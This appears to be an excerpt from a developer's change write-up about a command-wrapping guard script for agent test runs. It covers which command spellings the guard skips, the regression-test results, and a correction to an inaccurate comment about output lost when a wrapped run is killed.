It **over-matches on purpose**: `pytest --cov=scripts/regenloop_guard.py` reads as routed and is left unwrapped. That is the safe direction — one command missing admission control, versus a six-hour hang.

### Verified, both directions

All 15 cases pass: the four round-1 must-wrap cases still wrap; the four regression forms above are skipped; and so are `wrap_command()`'s own output, `python3 /x/scripts/regenloop_guard.py run …`, `python3 scripts/gate_runner.py --safe`, `uv run python …/regenloop_guard.py`, `npx python3 …`, `./regenloop_guard.py` and bare `regenloop_guard.py`.

The regression test now carries all four regression forms plus four ordinary spellings: **64 passed, 14 subtests** (up from 6).

### Also corrected: the round-1 F2 comment was itself inaccurate

The merge check found that round 1's replacement comment claimed a harness kill under the wrap behaves "exactly as an unwrapped foreground call of the same suite would be". **It does not.** `run()` captures the child through `stdout=PIPE`/`stderr=PIPE` and `_cmd_run` prints only after `run()` returns, so a kill at the ceiling discards the buffer entirely and the agent sees *nothing* — where an unwrapped run streams, and whatever it printed survives.
